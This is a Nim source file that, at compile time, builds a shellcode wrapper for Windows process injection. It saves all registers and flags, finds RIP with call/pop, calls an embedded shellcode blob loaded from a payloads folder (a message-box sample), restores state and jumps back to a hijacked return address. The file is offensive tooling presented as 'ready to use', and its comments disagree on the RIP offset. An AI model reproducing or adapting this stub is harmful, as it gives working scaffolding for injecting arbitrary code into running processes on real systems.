import winim
import winim/lean

# Read the payload from a binary file at compile time
const 
  payloadFileContent* = staticRead("../payloads/msgbox.bin")
  NOP*: byte = 0x90
  
# Stub + shellcode
# Define opcodes for register save/restore instructions
const
  # Register save instructions
  PUSHF*: byte = 0x9C
  PUSH_RAX*: byte = 0x50
  PUSH_RCX*: byte = 0x51
  PUSH_RDX*: byte = 0x52
  PUSH_RBX*: byte = 0x53
  PUSH_RBP*: byte = 0x55
  PUSH_RSI*: byte = 0x56
  PUSH_RDI*: byte = 0x57
  PUSH_R8*: array[2, byte] = [0x41, 0x50]
  PUSH_R9*: array[2, byte] = [0x41, 0x51]
  PUSH_R10*: array[2, byte] = [0x41, 0x52]
  PUSH_R11*: array[2, byte] = [0x41, 0x53]
  PUSH_R12*: array[2, byte] = [0x41, 0x54]
  PUSH_R13*: array[2, byte] = [0x41, 0x55]
  PUSH_R14*: array[2, byte] = [0x41, 0x56]
  PUSH_R15*: array[2, byte] = [0x41, 0x57]
  
  # Register restore instructions (in reverse order)
  POP_R15*: array[2, byte] = [0x41, 0x5F]
  POP_R14*: array[2, byte] = [0x41, 0x5E]
  POP_R13*: array[2, byte] = [0x41, 0x5D]
  POP_R12*: array[2, byte] = [0x41, 0x5C]
  POP_R11*: array[2, byte] = [0x41, 0x5B]
  POP_R10*: array[2, byte] = [0x41, 0x5A]
  POP_R9*: array[2, byte] = [0x41, 0x59]
  POP_R8*: array[2, byte] = [0x41, 0x58]
  POP_RDI*: byte = 0x5F
  POP_RSI*: byte = 0x5E
  POP_RBP*: byte = 0x5D
  POP_RBX*: byte = 0x5B
  POP_RDX*: byte = 0x5A
  POP_RCX*: byte = 0x59
  POP_RAX*: byte = 0x58
  POPF*: byte = 0x9D
  
  # Opcodes to simulate push RIP pop RAX (get RIP in RAX)
  # call $+5 (E8 00 00 00 00) - places the current address (RIP) on the stack
  # pop rax (58) - stores that address in RAX
  CALL_NEXT_INSTR*: array[5, byte] = [0xE8, 0x00, 0x00, 0x00, 0x00]
  
  # Opcode for add rax, 0x2E (add 0x2E to RAX, stack pointer pointing to the executable shellcode)
  # 48 05 28 00 00 00
  ADD_RAX_0x2E*: array[6, byte] = [0x48, 0x05, 0x2E, 0x00, 0x00, 0x00]
  
  # Opcode for call RAX (FF D0)
  CALL_RAX*: array[2, byte] = [0xFF, 0xD0]
  
  # JMP to the address stored in [memory address]
  # FF 25 00 00 00 00 followed by the address in little endian
  JMP_MEM_PTR*: array[6, byte] = [0xFF, 0x25, 0x00, 0x00, 0x00, 0x00]
  
# Convert the file content to a byte array with the new structure:
# [8 bytes for original return pointer]
# [pushes to save state]
# [call $+5 + pop rax to get RIP]
# [add rax, 0x28 to adjust the pointer]
# [call RAX]
# [pops to restore state]
# [jmp to the original address]
# [main shellcode]
proc buildFullPayload*(): auto =
  # Calculate the total size needed
  # 8 bytes for the return pointer
  # 1 byte for pushf
  # 8 bytes for general register pushes
  # 16 bytes for R8-R15 register pushes
  # 6 bytes to get RIP (call $+5 + pop rax)
  # 6 bytes for add rax, 0x28
  # 2 bytes for call RAX
  # 16 bytes for R15-R8 register pops
  # 8 bytes for general register pops
  # 1 byte for popf
  # 6 bytes for jmp [ptr]
  # 8 bytes for the address to jump to (we add this explicitly, although we'll use the return pointer space)
  # + size of the original shellcode
  const totalPreambleSize = 8 + 1 + 8 + 16 + 6 + 6 + 2 + 16 + 8 + 1 + 6 + 8
  const shellcodeMainOffset = totalPreambleSize
  
  var fullPayload: array[totalPreambleSize + payloadFileContent.len, byte]
  
  var currentPos = 0
  
  # Space for the original return pointer (will be filled later)
  for i in 0..<8:
    fullPayload[currentPos] = NOP # Use NOP as placeholder
    currentPos += 1
    
  # Add instructions to save registers
  fullPayload[currentPos] = PUSHF
  currentPos += 1
  
  fullPayload[currentPos] = PUSH_RAX
  currentPos += 1
  fullPayload[currentPos] = PUSH_RCX
  currentPos += 1
  fullPayload[currentPos] = PUSH_RDX
  currentPos += 1
  fullPayload[currentPos] = PUSH_RBX
  currentPos += 1
  fullPayload[currentPos] = PUSH_RBP
  currentPos += 1
  fullPayload[currentPos] = PUSH_RSI
  currentPos += 1
  fullPayload[currentPos] = PUSH_RDI
  currentPos += 1
  
  # Push R8-R15 (2-byte instructions)
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R8[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R9[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R10[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R11[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R12[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R13[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R14[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = PUSH_R15[i]
    currentPos += 1
    
  # Add instruction to get RIP in RAX (simulated push RIP)
  for i in 0..<5:
    fullPayload[currentPos] = CALL_NEXT_INSTR[i]
    currentPos += 1
  fullPayload[currentPos] = POP_RAX  # pop rax
  currentPos += 1
  
  # Add instruction to add 0x2E to RAX
  for i in 0..<6:
    fullPayload[currentPos] = ADD_RAX_0x2E[i]
    currentPos += 1
    
  # Add call RAX instruction
  for i in 0..<2:
    fullPayload[currentPos] = CALL_RAX[i]
    currentPos += 1
    
  # Add instructions to restore registers (in reverse order)
  for i in 0..<2:
    fullPayload[currentPos] = POP_R15[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R14[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R13[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R12[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R11[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R10[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R9[i]
    currentPos += 1
  for i in 0..<2:
    fullPayload[currentPos] = POP_R8[i]
    currentPos += 1
    
  fullPayload[currentPos] = POP_RDI
  currentPos += 1
  fullPayload[currentPos] = POP_RSI
  currentPos += 1
  fullPayload[currentPos] = POP_RBP
  currentPos += 1
  fullPayload[currentPos] = POP_RBX
  currentPos += 1
  fullPayload[currentPos] = POP_RDX
  currentPos += 1
  fullPayload[currentPos] = POP_RCX
  currentPos += 1
  fullPayload[currentPos] = POPF
  currentPos += 1
  
  # Add jmp to the address stored in [return pointer space]
  for i in 0..<6:
    fullPayload[currentPos] = JMP_MEM_PTR[i]
    currentPos += 1
    
  # Add absolute address of the return pointer (address of our buffer)
  # This address will be filled with the real address at runtime
  # Here we just put 0 as a placeholder
  for i in 0..<8:
    fullPayload[currentPos] = 0
    currentPos += 1
    
  # Finally, add the original shellcode (shellcode_main)
  for i in 0..<payloadFileContent.len:
    fullPayload[currentPos] = byte(payloadFileContent[i])
    currentPos += 1
    
  # Return the complete array
  return fullPayload

# Compiled payload ready to use
const payload* = buildFullPayload() 